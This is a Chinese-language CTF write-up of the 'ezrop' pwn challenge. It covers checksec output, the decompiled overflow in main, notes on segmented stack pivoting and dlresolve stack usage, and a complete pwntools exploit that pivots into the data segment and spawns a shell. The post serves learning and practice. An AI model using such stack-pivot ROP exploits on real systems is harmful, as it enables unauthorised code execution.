---
title: dlresolve-Feature-and-Segmented-stack-migration-ezrop
date: 2022-4-25
tags: 
- Pwn
- CTF

categories:
- CTF

toc: true # 是否启用内容索引
sidebar: none # 是否启用sidebar侧边栏，none：不启用
---





# dlresolve Feature and Segmented stack migration-ezrop

## 0x1 checksek

```bash
$ checksec ezrop 
[*] '/home/nemo/Active/Script/ezrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

开了NX和partial RELRO

## 0x2 Analysis

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[48]; // [rsp+0h] [rbp-30h] BYREF

  init(argc, argv, envp);
  puts("You can use stackoverflow.");
  puts("But only overflow a bit more...");
  puts("And you must print first.");
  memset(s, 0, 0x20uLL);
  write(1, s, 0x30uLL);
  read(0, s, 0x40uLL);
  return 0;
}
```

这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串

但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行

~~虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误~~

## 0x3 Process

1. 栈迁移到data段
2. 通过rbp控制read写入位置在数据段写入ROP链
3. getshell

## 0x4 Some questions

1. 对于这个通过rbp同时控制read位置和栈迁移的题目，我之前遇到过一次，但是当时没有做出来。调试过程中发现system一直失败，调试过程中发现原来是.got表中的dlresolve地址被改了一个字节\0a, 一个回车，分析之后发现原来是我ret 到read了三次，第三次read把sendline的回车读取了，写到了这个位置。因为对这个分段打栈迁移的技术还不是特别熟悉，现在终于理解这个技术，其实是实现了两次栈迁移。
2. 在解决了上面的问题，调试到system发现又失败了，继续跟进，发现seg fault在dlresolve向栈中保存的指令。发现dlreslove保存寄存器要在栈里面写一大段数据，因为我写入的是data段的开头，导致访问到了前面没有写入权限的位置。这起码要预留0x800的内存在前面，但是data段和bss段加起来都没有这么多，思考data和bss段所在的这一部分内存页权限应该是一致可写的，所以在这一段往后移了0x800

## 0x5 exp

```c
from pwn import*

p = process('./ezrop')
#p = gdb.debug('./ezrop')

m = u64(p.recv(40)[-8:])

payloads = p64(0x400863) + b'/bin/sh\0' + p64(0x400600)

payloads += cyclic(0x18)
payloads += p64(0x601848+0x30) + p64(0x4007d9)

p.send(payloads)

sleep(1)

payloads = p64(0x4006fa) + p64(0x400863) + p64(0x601868) + p64(0x400600) 
payloads += b'/bin/sh\0'
payloads += b'/bin/sh\0'
payloads += p64(0x601848-0x8) + p64(0x4007f9)

p.send(payloads)

p.interactive()

#0x00007f7b3ce92bb0      0x00007f7b3ccf8450
```

## 0x6 New skills

1. 分段打栈迁移
   - 在第一次read读入后将rbp改为要写入的位置
   - ret到read
   - 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8
   - 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置
2. dlrelsolve过程会保存大量寄存器数据，需要预留很大的栈空间